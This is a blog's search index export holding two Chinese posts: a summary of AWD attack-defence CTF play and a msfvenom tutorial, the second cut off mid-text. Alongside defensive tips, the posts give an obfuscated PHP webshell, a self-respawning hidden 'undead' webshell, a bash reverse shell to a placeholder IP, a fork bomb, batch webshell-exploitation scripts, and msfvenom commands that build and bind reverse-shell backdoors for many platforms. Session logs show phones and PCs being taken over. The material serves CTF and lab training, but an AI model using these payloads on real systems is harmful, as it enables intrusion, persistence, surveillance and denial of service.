<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>AWD 总结&amp;分析</title>
      <link href="/2023/04/07/AWD%E6%80%BB%E7%BB%93/"/>
      <url>/2023/04/07/AWD%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="AWD-总结-amp-分析"><a href="#AWD-总结-amp-分析" class="headerlink" title="AWD 总结&amp;分析"></a>AWD 总结&amp;分析</h1><h2 id="一-题目类型"><a href="#一-题目类型" class="headerlink" title="一:题目类型"></a>一:题目类型</h2><p>1-出题人自己写的cms，为了恶心然后加个so。</p><p>2-常见或者不常见的cms。</p><p>3-一些框架漏洞，比如ph师傅挖的CI这种</p><h2 id="二-题目漏洞类型"><a href="#二-题目漏洞类型" class="headerlink" title="二:题目漏洞类型"></a>二:题目漏洞类型</h2><p>1-sqli居多</p><p>2-文件包含</p><p>3-各种rce</p><p>4-文件上传</p><h2 id="三-拿flag方式"><a href="#三-拿flag方式" class="headerlink" title="三:拿flag方式"></a>三:拿flag方式</h2><p>1-是向内网一台机器发送http请求，返回请求中包含flag。</p><p>2-是例如&#x2F;home目录下放置flag文件。</p><h2 id="四-防御"><a href="#四-防御" class="headerlink" title="四.防御"></a>四.防御</h2><h3 id="1-流量"><a href="#1-流量" class="headerlink" title="1.流量"></a>1.流量</h3><pre><code>sudo tcpdump -s 0 -w flow.pcap port 80</code></pre><h3 id="2-日志分析"><a href="#2-日志分析" class="headerlink" title="2.日志分析"></a>2.日志分析</h3><p>日志地址</p><pre><code>/var/log/apache2//usr/local/apache2/logs/usr/nginx/logs/</code></pre><h3 id="3-打包源码-amp-备份数据库"><a href="#3-打包源码-amp-备份数据库" class="headerlink" title="3.打包源码&amp;备份数据库"></a>3.打包源码&amp;备份数据库</h3><pre><code># 打包目录tar -zcvf archive_name.tar.gz directory_to_compresstar -zcvf back.tar.gz /var/www/html# 解包tar -zxvf archive_name.tar.gz# 备份指定的多个数据库mysqldump -u root -p --databases choose test &gt; /tmp/db.sqlmysqldump -u db_user -p db_passwd db_name &gt; 1.sql //备份指定数据库 # 恢复备份，在mysql终端下执行：mysql -u db_user -p db_passwd db_name &lt; 1.sql //还原指定数据库 # 命令格式：source FILE_PATHsource ~/db.sql# 曾经遇到一个备份有问题可以执行下面mysqldump -u root --all-databases —skip-lock-tables &gt; /tmp/db.sql# 重置mysql密码# 方法1：用SET PASSWORD命令  mysql&gt; set password for 用户名@localhost = password(&#39;新密码&#39;);# 方法2：用mysqladmin mysqladmin -u用户名 -p旧密码 password 新密码</code></pre><h3 id="4-重置ssh密码"><a href="#4-重置ssh密码" class="headerlink" title="4.重置ssh密码"></a>4.重置ssh密码</h3><p>登陆后一个<code>passwd</code>就可以<br>但其实还是有脚本的<br>比如批量改默认密码</p><pre><code>#!/usr/bin/python#-*-coding:utf-8-*-import paramikoimport socketdef userssh_changepwd(ip,user,old_password,new_password):    # 建立一个sshclient对象    ssh = paramiko.SSHClient()    # 允许将信任的主机自动加入到host_allow 列表，此方法必须放在connect方法的前面    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())    try:        ssh.connect(hostname=ip, port=22, username=user, password=old_password,timeout=5)        stdin, stdout, stderr = ssh.exec_command(&quot;ls ~&quot;)        s=str(stdout.read(),&#39;utf-8&#39;)        for i in s.split(&#39;\n&#39;):            if(&quot;flag&quot; in i):                command1=&quot;cat ~/%s&quot; %(i.strip())                stdin, stdout, stderr = ssh.exec_command(command1)                flag=str(stdout.read(),&#39;utf-8&#39;)                print(&quot;%s-%s&quot; %(ip,flag.strip()))        command = &quot;passwd %s\n&quot; %(user)        stdin, stdout, stderr = ssh.exec_command(command)        #\n模拟回车 输两次密码        stdin.write(old_password+&#39;\n&#39;+ new_password + &#39;\n&#39; + new_password + &#39;\n&#39;)        out, err = stdout.read(), stderr.read()        #print(out)        successful = &#39;password updated successfully&#39;        #print(out,err)        if successful in str(err):            print(ip + &quot; 密码修改成功！&quot;)        else:            print(&#39;\033[31m错误：\033[0m&#39; + str(err))            print(ip + &quot; 密码修改失败！&quot;)        # 关闭连接        ssh.close()    except paramiko.ssh_exception.AuthenticationException as e:        print(ip + &#39; &#39; + &#39;\033[31m账号密码错误!\033[0m&#39;)        with open(&#39;nossh.txt&#39;,&#39;a&#39;) as f:            f.write(ip + &#39;\n&#39;)    except socket.timeout as e:        print(ip + &#39; &#39; + &#39;\033[31m连接超时！\033[0m&#39;)        with open(&#39;timeoutssh&#39;,&#39;a&#39;) as f:            f.write(ip + &#39;\n&#39;)user=&quot;bee&quot;old_passwd=&quot;xbwkaliwin2003&quot;new_passwd=&quot;xbwkaliwin2008&quot;with open(&#39;ip.txt&#39;,&#39;r&#39;) as f:    for i in f.readlines():        host=i.strip()        userssh_changepwd(host, user, old_passwd, new_passwd)</code></pre><h3 id="5-部署waf"><a href="#5-部署waf" class="headerlink" title="5.部署waf"></a>5.部署waf</h3><p>whatchwaf<br>说明：</p><ul><li><p>下载最新<a href="https://github.com/leohearts/awd-watchbird/releases">release</a></p></li><li><p>将waf.so,watchbird.php文件存放在&#x2F;var&#x2F;www&#x2F;html或其他目录中</p></li><li><p>将watchbird.php放在www-data可读的目录, 确保当前用户对目标目录可写, 然后执行<code>php watchbird.php --install [Web目录]</code>, 安装器将输出安装了watchbird的文件路径</p></li><li><p>访问任意启用了waf的文件, 参数<code>?watchbird=ui</code>打开watchbird控制台, 创建一个初始密码</p></li><li><p>如需卸载, 请在相同的位置输入<code>php watchbird.php --uninstall [Web目录]</code>, 如果您多次运行了安装, 请多次运行卸载直到卸载器无输出<br>ps：由于chrome无法允许不安全的网站(无SSL证书)显示通知,请使用Firefox并修改about:config中dom.webnotifications.allowinsecure为true)</p><p><strong>ps：php7应该不支持，不要放到root目录下（awd模式下也不会有root权限）要放在对应网页权限的目录下（默认网页权限是www-data)比如&#x2F;var&#x2F;www&#x2F;目录</strong></p></li></ul><h3 id="6-查找后门"><a href="#6-查找后门" class="headerlink" title="6.查找后门"></a>6.查找后门</h3><pre><code>find . -name &#39;*.php&#39; | xargs grep -n &#39;eval(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;assert(&#39;find . -name &#39;*.php&#39; | xargs grep -n &#39;system(&#39;</code></pre><h3 id="7-查找关键文件"><a href="#7-查找关键文件" class="headerlink" title="7.查找关键文件"></a>7.查找关键文件</h3><pre><code>#备份文件find / -name &quot;*.bak&quot;#config文件find / -name &quot;config.*&quot;</code></pre><p><strong>查找flag的位置</strong></p><pre><code>find / -name *flag* </code></pre><p><strong>查找password</strong></p><pre><code>find .|xargs grep &quot;password&quot; </code></pre><p><strong>查看以建立的连接和进程</strong></p><pre><code>netstat -antulp | grep EST </code></pre><p><strong>结束进程</strong></p><pre><code>kill PIDkillall &lt;进程名&gt; </code></pre><p><strong>检测TCP连接数量</strong></p><pre><code>netstat -ant|awk|grep |sed -e-e |sort|uniq -c|sort -rn </code></pre><p><strong>chattr命令防止系统中某个关键文件被修改</strong></p><pre><code>chattr +i /etc/resolv.conf </code></pre><p><strong>流量监控</strong></p><p>当别人访问我们靶机时请求的URL可能就是攻击的payload,我们如果知道他们的请求就可以利用他们的手段来反打过去，这个基于流量监控来实现，一个简单的脚本如下：</p><pre><code>&lt;?phpdate_default_timezone_set(&#39;Asia/Shanghai&#39;);$ip = $_SERVER[&quot;REMOTE_ADDR&quot;]; //记录访问者的ip$filename = $_SERVER[&#39;PHP_SELF&#39;]; //访问者要访问的文件名$parameter = $_SERVER[&quot;QUERY_STRING&quot;]; //访问者要请求的参数$time = date(&#39;Y-m-d H:i:s&#39;,time()); //访问时间$logadd = &#39;来访时间：&#39;.$time.&#39;--&gt;&#39;.&#39;访问链接：&#39;.&#39;http://&#39;.$ip.$filename.&#39;?&#39;.$parameter.&quot;\r\n&quot;;// log记录$fh = fopen(&quot;log.txt&quot;, &quot;a&quot;);fwrite($fh, $logadd);fclose($fh);?&gt; </code></pre><h3 id="8-干掉不死马"><a href="#8-干掉不死马" class="headerlink" title="8.干掉不死马"></a>8.干掉不死马</h3><p>(1).<code>ps auxww|grep shell.php</code> 找到pid后杀掉进程就可以，你删掉脚本是起不了作用的，因为php执行的时候已经把脚本读进去解释成opcode运行了</p><p>(2).重启php等web服务</p><p>(3).用一个ignore_user_abort(true)脚本，一直竞争写入（断断续续）。usleep要低于对方不死马设置的值。</p><p>(4).创建一个和不死马生成的马一样名字的文件夹。</p><h3 id="9-关闭不必要端口"><a href="#9-关闭不必要端口" class="headerlink" title="9.关闭不必要端口"></a>9.关闭不必要端口</h3><p>一些端口会存在漏洞，为了保证安全我们关闭一些不必要的端口来进行维护：</p><p><img src="https://p1-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/f842743427944186be4247b05303d6ef~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image" alt="img"></p><h2 id="五-攻击"><a href="#五-攻击" class="headerlink" title="五.攻击"></a>五.攻击</h2><h3 id="1-crontab自动提交flag到平台"><a href="#1-crontab自动提交flag到平台" class="headerlink" title="1.crontab自动提交flag到平台"></a>1.crontab自动提交flag到平台</h3><pre><code>*/5 * * * * curl 172.16.100.5:9000/submit_flag/ -d &#39;flag=&#39;$(cat /home/web/flag/flag)&#39;&amp;token=7gsVbnRb6ToHRMxrP1zTBzQ9BeM05oncH9hUoef7HyXXhSzggQoLM2uXwjy1slr0XOpu8aS0qrY&#39;</code></pre><p>记得改token和目录<br>crontab路径<br><code>/var/spool/cron</code></p><h3 id="2-扫描主机"><a href="#2-扫描主机" class="headerlink" title="2.扫描主机"></a>2.扫描主机</h3><pre><code># masscanmasscan -p 80 172.16.0.0/24# nmapnmap –sn 172.16.0.0/24</code></pre><h3 id="3-混淆过的一句话"><a href="#3-混淆过的一句话" class="headerlink" title="3.混淆过的一句话"></a>3.混淆过的一句话</h3><pre><code>&lt;?php  $sF=&quot;PCT4BA6ODSE_&quot;;$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=$&#123;strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])&#125;[&#39;n985de9&#39;];if(isset($s22))&#123;eval($s21($s22));&#125;?&gt;配置填`n985de9=QGV2YWwoJF9QT1NUWzBdKTs=`连接密码:0（零）</code></pre><h3 id="5-查看出题者后来改动的地方-一般漏洞是改出来的）"><a href="#5-查看出题者后来改动的地方-一般漏洞是改出来的）" class="headerlink" title="5.查看出题者后来改动的地方(一般漏洞是改出来的）"></a>5.查看出题者后来改动的地方(一般漏洞是改出来的）</h3><pre><code>ls -t按修改时间来看最新被修改的文件</code></pre><h3 id="4-fork炸弹（直接摧毁服务器）"><a href="#4-fork炸弹（直接摧毁服务器）" class="headerlink" title="4.fork炸弹（直接摧毁服务器）"></a>4.fork炸弹（直接摧毁服务器）</h3><pre><code>:() &#123; :|: &amp; &#125;;:</code></pre><p><strong>————恢复内容结束————</strong></p><h3 id="5-弱口令"><a href="#5-弱口令" class="headerlink" title="5.弱口令"></a>5.弱口令</h3><p>当发现靶机存在弱口令后，我们就可以遍历IP地址来查询存活的机器来自动连接查找FLAG,或者在受害者靶机里植入后门文件来维持我们的控制。</p><h3 id="6-自带后门"><a href="#6-自带后门" class="headerlink" title="6.自带后门"></a>6.自带后门</h3><p>通常靶机会有自带的后门木马，我们知道路径后便可以写一个脚本批量连接来提交FLAG。</p><h3 id="7-WEB攻击"><a href="#7-WEB攻击" class="headerlink" title="7.WEB攻击"></a>7.WEB攻击</h3><p>举几个比较常见的WEB攻击方式:</p><blockquote><p>文件读取，伪协议方式读取flag</p></blockquote><blockquote><p>文件上传，绕过黑白名单上传一句话，用工具连接查找flag</p></blockquote><blockquote><p>命令执行，通过system等函数来遍历文件</p></blockquote><blockquote><p>SQL注入，寻找注入点注出flag</p></blockquote><p>当我们找到上面漏洞后，尽量去写一个脚本来自动提交flag，之后再去寻找其他漏洞。</p><h3 id="8-写入木马"><a href="#8-写入木马" class="headerlink" title="8.写入木马"></a>8.写入木马</h3><p>因为AWD赛制是回合制，所以我们要想保持长时间稳定上分就要时刻控制别人靶机，也就是要传入木马但又不能被对手发现，下面列举几个权限维持的小技巧。</p><h4 id="bash反弹shell"><a href="#bash反弹shell" class="headerlink" title="bash反弹shell"></a><strong>bash反弹shell</strong></h4><p>利用预留后门上传上面的php文件并访问，就可以用nc反弹shell，nc反弹shell命令如下：</p><pre><code>bash -i &gt;&amp; /dev/tcp/xx.xxx.xxx.xxx/9 0&gt;&amp;1nc -l -p 8080 </code></pre><p><img src="https://p6-juejin.byteimg.com/tos-cn-i-k3u1fbpfcp/36661890a1e84381bbcab4db5837f459~tplv-k3u1fbpfcp-zoom-in-crop-mark:4536:0:0:0.image" alt="img"></p><p><strong>注意：</strong> 使用bash命令，会在root目录生成名为~&#x2F;.bash_history的记录文件，我们要清除来消除威胁。</p><h4 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a><strong>不死马</strong></h4><p>一个简单的不死马：</p><pre><code>&lt;?php    ignore_user_abort(true);    set_time_limit(0);    unlink(__FILE__);    $file = &#39;.config.php&#39;;    $code = &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&#39;;    //pass=pass    while (1)&#123;    file_put_contents($file,$code);    system(&#39;touch -m -d &quot;2020-10-21 04:17:18&quot; .config.php&#39;);    usleep(5000);    &#125;    ?&gt; </code></pre><p>不死马的作用就是将该php文件上传到服务器，然后进行访问，会在该路径下循环生成名字为.config.php的不死马隐藏文件。以此来达到权限维持。</p><h2 id="六-提交脚本"><a href="#六-提交脚本" class="headerlink" title="六.提交脚本"></a>六.提交脚本</h2><p>比赛中可能会有几十台靶机，尽管我们知道了如何攻击，但一个一个打似乎有一些太慢了，所以这时我们要利用脚本去批量提交解放双手。这里就在网上找了几个常用的：</p><p>预留后门利用脚本：</p><pre><code>import requestsurl_head=&quot;http://xxx.xx.xxx.&quot;#网段url=&quot;&quot;shell_addr=&quot;/Upload/index.php&quot;passwd=&quot;xxxxx&quot;#木马密码port=&quot;80&quot;payload =&#123;passwd: &#39;system(&#39;cat /flag&#39;);&#39;&#125;webshelllist=open(&quot;webshelllist.txt&quot;,&quot;w&quot;)flag=open(&quot;firstround_flag.txt&quot;,&quot;w&quot;)for i in range(30,61):url=url_head+str(i)+&quot;:&quot;+port+shell_addrtry:res=requests.post(url,payload,timeout=1)if res.status_code == requests.codes.ok:result = url+&quot; connect shell sucess,flag is &quot;+res.textprint resultprint &gt;&gt;flag,resultprint &gt;&gt;webshelllist,url+&quot;,&quot;+passwdelse:print &quot;shell 404&quot;except:print url+&quot; connect shell fail&quot;webshelllist.close()flag.close() </code></pre><p>批量提交flag脚本（需根据要求自行修改）：</p><p>&#96;&#96;&#96;<br>import sys<br>import json<br>import urllib<br>import httplib<br>server_host &#x3D; ‘ ‘#提交flag的服务器地址<br>server_port &#x3D; 80<br>def submit(team_token, flag, host&#x3D;server_host, port&#x3D;server_port, timeout&#x3D;5):if not team_token or not flag:raise Exception(‘team token or flag wrong’)conn &#x3D; httplib.HTTPConnection(host, port, timeout&#x3D;timeout)params &#x3D; urllib.urlencode(</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Msfvenom介绍及利用</title>
      <link href="/2023/03/26/Msfvenom%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
      <url>/2023/03/26/Msfvenom%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Msfvenom介绍及利用"><a href="#Msfvenom介绍及利用" class="headerlink" title="Msfvenom介绍及利用"></a>Msfvenom介绍及利用</h1><h4 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h4><p>msfvenom a Metasploit standalone payload generator，Also a replacement for msfpayload and msfencode.是用来生成后门的软件。<br>MSFvenom是Msfpayload和Msfencode的组合，将这两个工具都放在一个Framework实例中。自2015年6月8日起，msfvenom替换了msfpayload和msfencode。</p><h4 id="参数介绍"><a href="#参数介绍" class="headerlink" title="参数介绍"></a>参数介绍</h4><pre><code class="-">-l, --list &lt;type&gt; 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops,......all-p, --payload &lt; payload&gt; 指定需要使用的payload(攻击荷载)。也可以使用自定义payload,几乎是支持全平台的-f, --format &lt; format&gt; 指定输出格式-e, --encoder &lt;encoder&gt; 指定需要使用的encoder（编码器），指定需要使用的编码，如果既没用-e选项也没用-b选项，则输出raw payload-a, --arch &lt; architecture&gt; 指定payload的目标架构，例如x86 还是 x64 还是 x86_64-o, --out &lt; path&gt; 指定创建好的payload的存放位置-b, --bad-chars &lt; list&gt; 设定规避字符集，指定需要过滤的坏字符。例如：不使用 &#39;\x0f&#39;、&#39;\x00&#39;-n, --nopsled &lt; length&gt; 为payload预先指定一个NOP滑动长度-s, --space &lt; length&gt; 设定有效攻击荷载的最大长度，就是文件大小-i, --iterations &lt; count&gt; 指定payload的编码次数-c, --add-code &lt; path&gt; 指定一个附加的win32 shellcode文件-x, --template &lt; path&gt; 指定一个自定义的可执行文件作为模板,并将payload嵌入其中-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行-v, --var-name &lt; value&gt; 指定一个自定义的变量，以确定输出格式-t, --timeout &lt;second&gt; 从stdin读取有效负载时等待的秒数（默认为30，0表示禁用）-h,--help 查看帮助选项--platform &lt; platform&gt; 指定payload的目标平台</code></pre><h2 id="后门的生成："><a href="#后门的生成：" class="headerlink" title="后门的生成："></a>后门的生成：</h2><p>首先通过各种操作系统，脚本语言来生成后门：<br>常用参数说明：</p><table><thead><tr><th>e 编码方式</th></tr></thead><tbody><tr><td>i 编码次数</td></tr><tr><td>b 在生成的程序中避免出现的值</td></tr><tr><td>f 输出格式</td></tr><tr><td>p 选择payload</td></tr><tr><td>l 查看所有payload</td></tr><tr><td>a 选择架构平台(x86|x64|x86_64)</td></tr><tr><td>o 文件输出</td></tr><tr><td>c 添加自己的shellcode</td></tr><tr><td>x|k 捆绑</td></tr></tbody></table><h3 id="基本格式："><a href="#基本格式：" class="headerlink" title="基本格式："></a>基本格式：</h3><pre><code class="bash">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</code></pre><h3 id="木马简单免杀："><a href="#木马简单免杀：" class="headerlink" title="木马简单免杀："></a>木马简单免杀：</h3><pre><code class="bash">msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder times&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;msfvenom –p windows/meterpreter/reverse_tcp –i 3 –e x86/shikata_ga_nai –f exe –o C:\back.exe</code></pre><h3 id="普通捆绑："><a href="#普通捆绑：" class="headerlink" title="普通捆绑："></a>普通捆绑：</h3><pre><code class="bash">msfvenom –p windows/meterpreter/reverse_tcp –platform windows –a x86 –x C:\nomal.exe –k –f exe –o C:\shell.exe</code></pre><h3 id="Linux："><a href="#Linux：" class="headerlink" title="Linux："></a>Linux：</h3><pre><code class="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port to Connect On&gt; -f elf &gt; shell.elf</code></pre><h3 id="Windows："><a href="#Windows：" class="headerlink" title="Windows："></a>Windows：</h3><pre><code class="bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></pre><h3 id="Mac："><a href="#Mac：" class="headerlink" title="Mac："></a>Mac：</h3><pre><code class="bash">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></pre><h3 id="Android："><a href="#Android：" class="headerlink" title="Android："></a>Android：</h3><pre><code class="bash">msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R &gt; shell.apk</code></pre><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP:"></a>PHP:</h3><pre><code class="BASH">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</code></pre><h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP:"></a>ASP:</h3><pre><code class="BASH">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f aspx &gt; shell.asp</code></pre><h3 id="ASPX"><a href="#ASPX" class="headerlink" title="ASPX:"></a>ASPX:</h3><pre><code class="BASH">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f aspx &gt; shell.aspx</code></pre><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP:"></a>JSP:</h3><pre><code class="BASH">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></pre><h3 id="WAR"><a href="#WAR" class="headerlink" title="WAR:"></a>WAR:</h3><pre><code class="BASH">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></pre><h3 id="BASH"><a href="#BASH" class="headerlink" title="BASH:"></a>BASH:</h3><pre><code class="BASH">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></pre><h3 id="PERL"><a href="#PERL" class="headerlink" title="PERL:"></a>PERL:</h3><pre><code class="BASH">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></pre><h3 id="PYTHON"><a href="#PYTHON" class="headerlink" title="PYTHON:"></a>PYTHON:</h3><pre><code class="BASH">msfvenom -p python/meterpreter/reverser_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></pre><p>基于现在网络安全意识的提高，普通的木马很难在win上存活，需要经过多次的复杂的编码，所以我们学习的路还很长！</p><h2 id="msf反弹shell"><a href="#msf反弹shell" class="headerlink" title="msf反弹shell"></a>msf反弹shell</h2><p>当我们的木马已经上传到目标靶机系统并正常运行之后，靶机会主动连接我们所指定的ip和端口，形成反弹shell的操作，我们只需要做的是监听kaili的所指定的端口即可。</p><p>首先进入msfconsole的shell：</p><pre><code class="bash">msfconsole</code></pre><p>调用监听模块：</p><pre><code class="bash">msf5 &gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcpmsf5 exploit(multi/handler) &gt; show options Module options (exploit/multi/handler):   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options (generic/shell_reverse_tcp):   Name   Current Setting  Required  Description   ----   ---------------  --------  -----------   LHOST                   yes       The listen address (an interface may be specified)   LPORT  4444             yes       The listen portExploit target:   Id  Name   --  ----   0   Wildcard Targetmsf5 exploit(multi/handler) &gt; set LHOST 192.168.1.102LHOST =&gt; 192.168.1.102msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.102:4444 123456789101112131415161718192021222324252627282930</code></pre><p>这里可以根据需要设置LHOST与LPORT参数，也可以指定对应的攻击载荷</p><h2 id="实践："><a href="#实践：" class="headerlink" title="实践："></a>实践：</h2><p>这里对市面上主流的操作系统与脚本语言进行实验，这里因为博主实在穷买不起水果电脑，这里MAC的实验直接跳过。</p><h3 id="Windows：-1"><a href="#Windows：-1" class="headerlink" title="Windows："></a>Windows：</h3><p>win7（靶机）：192.168.1.106</p><p>Kali（攻击机）：192.168.1.102</p><p>首先在Kali里面生成基于windows系统的木马：</p><pre><code class="bash">root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=4444 -f exe &gt; shell.exe[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 341 bytesFinal size of exe file: 73802 bytesroot@kali:~# 1234567</code></pre><p>使用msf模块进行端口监听（注意这里要设置与木马payload对应的载荷）：</p><pre><code>msf5 &gt; use exploit/multi/Display all 340 possibilities? (y or n)msf5 &gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcpmsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcppayload =&gt; windows/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set LHOST 192.168.1.102LHOST =&gt; 192.168.1.102msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.102:4444 123456789101112</code></pre><p>将后门上传到靶机中并双击运行：</p><p><img src="/../pic/Msfvenom%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8.assets/1.png" alt="在这里插入图片描述"></p><p>我们回到kali发现已经得到靶机meterpreter的shell了：</p><pre><code>msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.102:4444 [*] Sending stage (176195 bytes) to 192.168.1.106[*] Meterpreter session 3 opened (192.168.1.102:4444 -&gt; 192.168.1.106:49164) at 2020-10-01 14:09:34 +0800meterpreter &gt; getuidServer username: WY-PC\WYmeterpreter &gt; 123456789</code></pre><h3 id="Linux：-1"><a href="#Linux：-1" class="headerlink" title="Linux："></a>Linux：</h3><p>CentOS7（靶机）：192.168.1.103</p><p>Kali（攻击机）：192.168.1.102</p><p>首先在Kali里面生成基于Linux系统的木马：</p><pre><code class="bash">root@kali:~# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=4444 -f elf &gt; shell.elf[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload[-] No arch selected, selecting arch: x86 from the payloadNo encoder specified, outputting raw payloadPayload size: 123 bytesFinal size of elf file: 207 bytesroot@kali:~# 1234567</code></pre><p>使用msf模块进行端口监听（注意这里要设置与木马payload对应的载荷）：</p><pre><code>msf5 &gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcpmsf5 exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcppayload =&gt; linux/x86/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set LHOST 192.168.1.102LHOST =&gt; 192.168.1.102msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.102:4444 12345678</code></pre><p>将后门上传到靶机中并.&#x2F;运行：</p><pre><code>[root@localhost ~]# chmod 777 shell.elf [root@localhost ~]# ./shell.elf &amp;[1] 2746[root@localhost ~]# ps -ef |grep shell.elfroot       2746   2504  0 14:22 pts/0    00:00:00 ./shell.elfroot       2754   2504  0 14:23 pts/0    00:00:00 grep --color=auto shell.elf[root@localhost ~]# 1234567</code></pre><p>我们回到kali发现已经得到靶机meterpreter的shell了：</p><pre><code>msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.102:4444 [*] Sending stage (980808 bytes) to 192.168.1.103[*] Meterpreter session 2 opened (192.168.1.102:4444 -&gt; 192.168.1.103:55342) at 2020-10-01 14:22:57 +0800meterpreter &gt; getuidServer username: no-user @ localhost.localdomain (uid=0, gid=0, euid=0, egid=0)meterpreter &gt; 123456789</code></pre><h3 id="Android：-1"><a href="#Android：-1" class="headerlink" title="Android："></a>Android：</h3><p>MI8（手机）：192.168.1.104</p><p>Kali（攻击机）：192.168.1.102</p><p>首先在Kali里面生成基于Android系统的木马：</p><pre><code>root@kali:~# msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=4444 R &gt; shell.apk[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload[-] No arch selected, selecting arch: dalvik from the payloadNo encoder specified, outputting raw payloadPayload size: 10187 bytesroot@kali:~# 123456</code></pre><p>使用msf模块进行端口监听（注意这里要设置与木马payload对应的载荷）：</p><pre><code>msf5 &gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcpmsf5 exploit(multi/handler) &gt; set payload android/meterpreter/reverse_tcppayload =&gt; android/meterpreter/reverse_tcpmsf5 exploit(multi/handler) &gt; set LHOST 192.168.1.102LHOST =&gt; 192.168.1.102msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.102:4444 123456789</code></pre><p>将后门安装到手机并点击运行：</p><p><img src="/../pic/Msfvenom%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8.assets/2.png" alt="在这里插入图片描述"></p><p>我们回到kali发现已经得到靶机meterpreter的shell了：</p><pre><code>msf5 exploit(multi/handler) &gt; run[*] Started reverse TCP handler on 192.168.1.102:4444 [*] Sending stage (73808 bytes) to 192.168.1.104[*] Meterpreter session 1 opened (192.168.1.102:4444 -&gt; 192.168.1.104:38078) at 2020-10-01 14:39:51 +0800meterpreter &gt; sysinfoComputer    : localhostOS          : Android 10 - Linux 4.&lt;...&gt;Meterpreter : dalvik/androidmeterpreter &gt; 1234567891011</code></pre><p>拓展：</p><h4 id="扫描手机摄像头-这里又两个摄像头前置和后置-："><a href="#扫描手机摄像头-这里又两个摄像头前置和后置-：" class="headerlink" title="扫描手机摄像头(这里又两个摄像头前置和后置)："></a>扫描手机摄像头(这里又两个摄像头前置和后置)：</h4><pre><code>meterpreter &gt; webcam_list1: Back Camera2: Front Camera123</code></pre><h4 